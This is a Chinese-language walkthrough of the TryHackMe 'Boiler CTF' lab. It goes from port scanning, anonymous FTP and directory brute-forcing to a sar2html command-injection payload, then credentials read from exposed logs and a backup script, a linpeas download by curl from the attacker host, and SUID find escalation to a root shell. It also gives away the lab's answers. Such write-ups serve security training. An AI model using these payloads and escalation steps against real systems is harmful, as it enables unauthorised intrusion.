# 服务发现
```
┌──(root💀kali)-[~/tryhackme/boilerctf]
└─#  nmap -sV -Pn 10.10.109.157 -p-
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-30 02:04 EDT
Nmap scan report for 10.10.109.157
Host is up (0.31s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
10000/tcp open  http    MiniServ 1.930 (Webmin httpd)
55007/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 892.53 seconds

```

# 服务分析
开启了ftp服务，此版本没有比较出名的漏洞
可以匿名登录
有一个隐藏文件```.info.txt```下载到本地待分析
```
┌──(root💀kali)-[~/tryhackme/boilerctf]
└─#  ftp 10.10.109.157
Connected to 10.10.109.157.
220 (vsFTPd 3.0.3)
Name (10.10.109.157:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls -alh
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 .
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 ..
-rw-r--r--    1 ftp      ftp            74 Aug 21  2019 .info.txt
226 Directory send OK.
ftp> get .info.txt
local: .info.txt remote: .info.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for .info.txt (74 bytes).
226 Transfer complete.
74 bytes received in 0.00 secs (173.2989 kB/s)
ftp> bye
221 Goodbye.

```

文件内容应该是某种加密算法的密文：
```
┌──(root💀kali)-[~/tryhackme/boilerctf]
└─#  cat .info.txt 
Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!

```

没发现key，怀疑是凯撒加密，一个个测试，偏移位是：13
解密后的明文是：
```Just wanted to see if you find it. Lol. Remember: Enumeration is the key!```

如果```Enumeration```不是某种加密算法的key,那这个信息看起来没什么卵用。。。



80端口是一个http服务，首页是一个apache首页

# 目录爆破
```
──(root💀kali)-[~/dirsearch]
└─#  python3 dirsearch.py -e* -t 100 -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt -u http://10.10.109.157

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: * | HTTP method: get | Threads: 100 | Wordlist size: 220521

Error Log: /root/dirsearch/logs/errors-21-09-30_02-01-47.log

Target: http://10.10.109.157

[02:01:47] Starting: 
[02:01:49] 200 -   11KB - /
[02:01:56] 301 -  315B  - /manual  ->  http://10.10.109.157/manual/
[02:02:13] 301 -  315B  - /joomla  ->  http://10.10.109.157/joomla/
[02:07:02] 403 -  301B  - /server-status    
```


manual/是apache文档

继续爆破joomla/
```
┌──(root💀kali)-[~/dirsearch]
└─#  python3 dirsearch.py -e* -t 100 -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt -u http://10.10.109.157/joomla

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: * | HTTP method: get | Threads: 100 | Wordlist size: 220521

Error Log: /root/dirsearch/logs/errors-21-09-30_02-17-11.log

Target: http://10.10.109.157/joomla

[02:17:12] Starting: 
[02:17:14] 200 -   12KB - /joomla/
[02:17:15] 301 -  322B  - /joomla/images  ->  http://10.10.109.157/joomla/images/
[02:17:15] 301 -  323B  - /joomla/modules  ->  http://10.10.109.157/joomla/modules/
[02:17:20] 301 -  325B  - /joomla/templates  ->  http://10.10.109.157/joomla/templates/
[02:17:20] 301 -  321B  - /joomla/tests  ->  http://10.10.109.157/joomla/tests/
[02:17:20] 301 -  319B  - /joomla/bin  ->  http://10.10.109.157/joomla/bin/
[02:17:20] 301 -  321B  - /joomla/media  ->  http://10.10.109.157/joomla/media/
[02:17:20] 301 -  323B  - /joomla/plugins  ->  http://10.10.109.157/joomla/plugins/
[02:17:20] 301 -  324B  - /joomla/includes  ->  http://10.10.109.157/joomla/includes/
[02:17:21] 301 -  324B  - /joomla/language  ->  http://10.10.109.157/joomla/language/
[02:17:22] 301 -  326B  - /joomla/components  ->  http://10.10.109.157/joomla/components/
[02:17:22] 301 -  321B  - /joomla/cache  ->  http://10.10.109.157/joomla/cache/
[02:17:23] 301 -  325B  - /joomla/libraries  ->  http://10.10.109.157/joomla/libraries/
[02:17:27] 301 -  328B  - /joomla/installation  ->  http://10.10.109.157/joomla/installation/
[02:17:28] 301 -  321B  - /joomla/build  ->  http://10.10.109.157/joomla/build/
[02:17:29] 301 -  319B  - /joomla/tmp  ->  http://10.10.109.157/joomla/tmp/
[02:17:30] 301 -  323B  - /joomla/layouts  ->  http://10.10.109.157/joomla/layouts/
[02:17:37] 301 -  329B  - /joomla/administrator  ->  http://10.10.109.157/joomla/administrator/
[02:18:30] 301 -  319B  - /joomla/cli  ->  http://10.10.109.157/joomla/cli/
[02:19:30] 301 -  322B  - /joomla/_files  ->  http://10.10.109.157/joomla/_files/ 

```

这个内容就比较丰富了，一个个分析

```http://10.10.109.157/joomla/tests/```有文件遍历漏洞

```http://10.10.109.157/joomla/build/```有文件遍历漏洞


```http://10.10.109.157/joomla/tests/codeception/acceptance.suite.dist.yml```暴露默认账号密码```admin:admin```但是不可以登录后台	


```http://10.10.109.157/joomla/build/jenkins/```底下有两个比较敏感的文件文件：

文件：```unit-tests.sh```
```
# !/bin/bash
#  Script for preparing the unit tests in Joomla!

#  Path to the Joomla! installation
BASE="/opt/src"

until mysqladmin ping -h mysql --silent; do
  sleep 1
done

>&2 echo "Mysql alive!"

until psql -h "postgres" -U "postgres"  --quiet -o /dev/null -c '\l'; do
  sleep 1
done

>&2 echo "Postgres alive!"

#  Setup databases for testing
mysql -u root joomla_ut -h mysql -pjoomla_ut < "$BASE/tests/unit/schema/mysql.sql"
psql -c 'create database joomla_ut;'  -U postgres -h "postgres" > /dev/null
psql -U "postgres" -h "postgres" -d joomla_ut -a -f "$BASE/tests/unit/schema/postgresql.sql" > /dev/null

echo "Testing $PHPVERSION"

phpunit -c $BASE/jenkins-phpunit.xml 
```

文件：```docker-compose.yml	```
```
version: '2'

services:
  test:
    image: joomlaprojects/docker-${PHPVERSION}
    volumes:
     - ../..:/opt/src
    working_dir: /opt/src
    depends_on:
     - mysql
     - memcached
     - redis
     - postgres

  mysql:
   image: mysql:5.7
   restart: always
   environment:
     MYSQL_DATABASE: joomla_ut
     MYSQL_USER: joomla_ut
     MYSQL_PASSWORD: joomla_ut
     MYSQL_ROOT_PASSWORD: joomla_ut

  memcached:
    image: memcached

  redis:
    image: redis

  postgres:
    image: postgres
```

泄露mysql登录凭证


```http://10.10.109.157/joomla/administrator/```是joomla!的登录页面，cms版本未知


```http://10.10.109.157/joomla/_files/```页面有一个字符串

```VjJodmNITnBaU0JrWVdsemVRbz0K```

应该是被加密了，不知道用的什么加密算法


10000端口也是一个http服务，跑了一个webmin，需要https访问


这里找了好久，眼镜都花了,瞄了一眼大佬的walkthrough，原来还有个```_test```目录我没有扫描出来，尼玛。。。

```http://10.10.109.157/joomla/_test```是一个sar2html程序，此程序存在远程执行漏洞，见[这里](https://www.exploit-db.com/exploits/47204)

我们使用payload```http://10.10.109.157/joomla/_test/index.php?plot=;ls%20-alh```

然后点击```select host```，在底下的select框里就会回显我们的命令

期中有一个文件叫log.txt，这个也是第七题的答案
```
Aug 20 11:16:26 parrot sshd[2443]: Server listening on 0.0.0.0 port 22.
Aug 20 11:16:26 parrot sshd[2443]: Server listening on :: port 22.
Aug 20 11:16:35 parrot sshd[2451]: Accepted password for basterd from 10.1.1.1 port 49824 ssh2 # pass: superduperp@$$
Aug 20 11:16:35 parrot sshd[2451]: pam_unix(sshd:session): session opened for user pentest by (uid=0)
Aug 20 11:16:36 parrot sshd[2466]: Received disconnect from 10.10.170.50 port 49824:11: disconnected by user
Aug 20 11:16:36 parrot sshd[2466]: Disconnected from user pentest 10.10.170.50 port 49824
Aug 20 11:16:36 parrot sshd[2451]: pam_unix(sshd:session): session closed for user pentest
Aug 20 12:24:38 parrot sshd[2443]: Received signal 15; terminating.
```

拿到ssh凭证：```basterd:superduperp@$$```

user.txt在stoner的目录下，看来要横向提权到stoner


在basterd家目录有一个backup.sh文件,源码如下，文件暴露了stoner的密码：```superduperp@$$no1knows```
```
$ cat backup.sh
REMOTE=1.2.3.4

SOURCE=/home/stoner
TARGET=/usr/local/backup

LOG=/home/stoner/bck.log
 
DATE=`date +%y\.%m\.%d\.`

USER=stoner
# superduperp@$$no1knows

ssh $USER@$REMOTE mkdir $TARGET/$DATE


if [ -d "$SOURCE" ]; then
    for i in `ls $SOURCE | grep 'data'`;do
             echo "Begining copy of" $i  >> $LOG
             scp  $SOURCE/$i $USER@$REMOTE:$TARGET/$DATE
             echo $i "completed" >> $LOG

                if [ -n `ssh $USER@$REMOTE ls $TARGET/$DATE/$i 2>/dev/null` ];then
                    rm $SOURCE/$i
                    echo $i "removed" >> $LOG
                    echo "# # # # # # # # # # # # # # # # # # # # " >> $LOG
                                else
                                        echo "Copy not complete" >> $LOG
                                        exit 0
                fi 
    done
     

else

    echo "Directory is not present" >> $LOG
    exit 0
fi

```


切换stoner，拿到user flag：```.secret```
```
stoner@Vulnerable:/home$ cd stoner
stoner@Vulnerable:~$ ls
stoner@Vulnerable:~$ ls -alh
total 16K
drwxr-x--- 3 stoner stoner 4.0K Aug 22  2019 .
drwxr-xr-x 4 root   root   4.0K Aug 22  2019 ..
drwxrwxr-x 2 stoner stoner 4.0K Aug 22  2019 .nano
-rw-r--r-- 1 stoner stoner   34 Aug 21  2019 .secret
stoner@Vulnerable:~$ cat .secret
You made it till here, well done.

```


枚举提权漏洞，因为不能使用wget，用curl把linpea下载到本地:

```curl -O http://10.13.21.169:8000/linpeas.sh```


发现一个可以用于提权的SUID：```find```
```
stoner@Vulnerable:~$ /usr/bin/find . -exec /bin/sh -p \; -quit
#  id
uid=1000(stoner) gid=1000(stoner) euid=0(root) groups=1000(stoner),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
#  whoami
root
#  cd /root
#  ls
root.txt
#  cat root.txt
It wasn't that hard, was it?
#  

```
拿到 root flag